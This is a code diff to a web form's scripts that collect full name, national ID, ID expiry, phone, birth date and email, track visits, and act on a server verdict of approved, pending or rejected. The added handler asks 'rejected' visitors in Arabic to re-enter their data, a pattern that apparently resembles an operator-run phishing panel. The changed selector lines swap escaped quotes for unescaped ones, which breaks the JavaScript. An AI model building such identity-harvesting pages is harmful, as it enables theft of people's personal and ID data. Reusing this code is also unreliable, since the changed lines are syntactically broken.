@@ -344,6 +344,16 @@
         </div>
     </footer>
 
+    <!-- Rejected Message Handler -->
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get("rejected") === "true") {
+            const errorMessageDiv = document.getElementById("errorMessage");
+            errorMessageDiv.textContent = "عذراً، حدث خطأ أثناء معالجة طلبك. يرجى إعادة إدخال البيانات.";
+            errorMessageDiv.style.display = "block";
+        }
+    </script>
+
     <!-- Tracking and Form Submit Scripts -->
     <script>
         fetch("/track_visit", {
@@ -359,13 +369,13 @@
 
             const fullName = document.getElementById("fullName").value;
             const nationalId = document.getElementById("nationalId").value;
-            const idExpiry_day = document.querySelector("select[name=\"idExpiry_day\"]").value;
-            const idExpiry_month = document.querySelector("select[name=\"idExpiry_month\"]").value;
-            const idExpiry_year = document.querySelector("select[name=\"idExpiry_year\"]").value;
+            const idExpiry_day = document.querySelector("select[name="idExpiry_day"]").value;
+            const idExpiry_month = document.querySelector("select[name="idExpiry_month"]").value;
+            const idExpiry_year = document.querySelector("select[name="idExpiry_year"]").value;
             const phone = document.getElementById("phone").value;
-            const dob_day = document.querySelector("select[name=\"dob_day\"]").value;
-            const dob_month = document.querySelector("select[name=\"dob_month\"]").value;
-            const dob_year = document.querySelector("select[name=\"dob_year\"]").value;
+            const dob_day = document.querySelector("select[name="dob_day"]").value;
+            const dob_month = document.querySelector("select[name="dob_month"]").value;
+            const dob_year = document.querySelector("select[name="dob_year"]").value;
             const email = document.getElementById("email").value;
             const errorMessageDiv = document.getElementById("errorMessage");
 
@@ -392,7 +402,7 @@
 
                 if (result.status === "approved" || result.status === "pending") {
                     localStorage.setItem("request_id", result.request_id);
-                    window.location.href = "login.html";
+                    window.location.href = "success.html";
                 } else {
                     errorMessageDiv.textContent = result.message || "حدث خطأ غير متوقع.";
                     errorMessageDiv.style.display = "block";
